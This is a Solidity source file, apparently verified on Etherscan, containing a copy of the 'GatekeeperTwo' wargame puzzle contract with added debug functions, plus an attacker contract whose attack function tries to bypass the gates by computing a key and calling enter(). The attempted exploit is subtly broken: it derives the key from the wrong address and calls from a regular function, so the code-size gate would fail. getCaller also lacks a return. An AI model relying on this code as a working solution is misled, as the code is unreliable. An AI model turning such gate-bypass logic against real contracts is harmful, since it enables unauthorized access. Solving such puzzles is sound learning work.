/**
 *Submitted for verification at Etherscan.io on 2022-09-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;
  address public caller;
  uint public callSize;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }

  function returnCaller() public {
    address ca;
    uint sz;
    assembly { 
        ca := caller()
        sz := extcodesize(ca)
    } 

    caller = ca;
    callSize = sz;
  }

  function getCaller() view public returns(address) {
    return caller;
  }

  function getSize() view public returns(uint) {
    return callSize;
  }
}

contract CTEGatekeeperTwo {
    function attack(address _addressGate, address _addCTE) public {
        GatekeeperTwo GKT = GatekeeperTwo(_addressGate);
        uint64 ugateKey = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ (uint64(0) - 1);
        bytes8 bgateKey = bytes8(ugateKey);
        GKT.enter(bgateKey);
    }

    function getCaller(address _addressGate) public returns(address) {
        GatekeeperTwo GKT = GatekeeperTwo(_addressGate);
        GKT.returnCaller();
    }
}